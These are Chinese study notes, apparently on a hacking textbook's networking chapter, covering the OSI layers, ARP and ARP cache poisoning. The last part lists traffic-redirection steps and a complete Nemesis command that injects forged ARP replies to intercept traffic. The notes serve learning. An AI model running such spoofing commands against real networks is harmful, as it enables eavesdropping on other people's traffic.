# 4
## 4.2.6 
* telnet 程序会自动执行DNS查找，将域名转换成IP地址。

## 4.2.7
* 127.0.0.1 是一个特殊的回环地址，它路由到本机

## 4.3
* 会话层（第5层），使用套接字接口socket，实现从一个主机向另一个主机发送数据。
* 传输层（第4层），TCP协议提供可靠性和传输控制。
* 网络层（第3层），IP协议提供寻址和包级别的通信。
* 数据链路层（第2层），以太网提供端口间的寻址ARP协议。

## 4.3.1
* ARP请求是发往广播地址的消息。
* ARP协议会生成一个 IP at MAC 的表。

## 4.4.4
* 在交换网络中，嗅探的第一步是欺骗（spoofing）。

### ARP中令人感兴趣的3个小细节：
* 1、ARP协议（包括其他协议），无法确定源地址就是源机器地址；
* 2、ARP的应答会更新ARP缓存（除非ARP缓存中相应的项被标记为“永久”）；
* 3、即使系统没有发出ARP请求，也会接受ARP应答。

#### ARP缓存中毒：是供攻击者重写ARP缓存的技术。可进行网络流量的窃听。

#### *网络交换设备仅基于MAC地址过滤流量。

#### 由于ARP缓存超时的存在，系统会定期发动真实的ARP请求，并收到真实的应答。为持续进行重定向攻击，所以缓存投毒也要持续循环进行。

### 流量重定向步骤：
* 1、确定访问者和被访问者的IP地址和Mac地址
* (1) ping -c 1 192.168.0.1 // 访问者ip（A）,生成对应的ARP缓存
* (2) ping -c 1 192.168.0.118 // 被访问者ip（B）,生成对应的ARP缓存
* (3) arp -na // 查看缓存列表，缓存列表中可能查找不到对应的缓存记录（可以通过Wireshark抓包获取）
    * 得到:
    * 192.168.0.1 at 00:50:18:00:0F:01
    * 192.168.0.118 at 00:C0:F0:79:3D:30
    * localhost 192.168.0.193 at 00:00:AD:D1:C7:ED
    * ps：ping 使用的是icmp协议
    * MAC地址的长度为48位(6个字节，前3个字节代表网络硬件制造商的编号)ether 8c:85:90:79:28:3f
* 2、定期发送伪造的ARP应答
* (1) 使用 Nemesis（[ˈneməsɪs] 宿敌，报应）命令行数据包注入工具，注入伪造的ARP应答包。
* (2) 注入方式(伪造 A 到 B 的ARP应答)：sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M 00:C0:F0:79:3D:30

#### 在C语言中，typedef将一个符号定义为一个数据类型的别名。

